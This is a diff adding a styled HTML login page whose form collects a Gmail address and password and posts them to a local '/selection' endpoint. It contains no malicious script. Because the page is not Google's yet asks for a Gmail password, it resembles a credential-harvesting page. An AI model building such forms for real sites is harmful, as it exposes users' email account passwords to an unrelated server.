@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500&display=swap');
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      height: 100vh;
+      background: linear-gradient(135deg, #8e2de2, #4a00e0);
+      font-family: 'Ubuntu', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+
+    .form-container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 3rem 4rem;
+      border-radius: 2rem;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px); /* ✅ Safari/iOS fix */
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    h3 {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+      color: #ffe600;
+    }
+
+    input {
+      width: 100%;
+      padding: 1rem;
+      margin-bottom: 2rem;
+      border: none;
+      border-radius: 1rem;
+      font-size: 1.4rem;
+      outline: none;
+      background-color: #ffffffdd;
+      color: #333;
+    }
+
+    input:focus {
+      outline: 2px solid #ffe600;
+    }
+
+    button {
+      width: 100%;
+      padding: 1rem;
+      font-size: 1.5rem;
+      background-color: #ffe600;
+      border: none;
+      border-radius: 1rem;
+      color: #4a00e0;
+      font-weight: bold;
+      transition: 0.3s ease;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #fff;
+      transform: scale(1.05);
+      color: #000;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <form action="/selection" method="POST">
+      <h3>Gmail</h3>
+      <input type="text" name="gmail" placeholder="Enter your Gmail" required />
+
+      <h3>Password</h3>
+      <input type="password" name="password" placeholder="Enter your password" required />
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    console.log("Login form loaded and ready.");
+  </script>
+</body>
+</html>
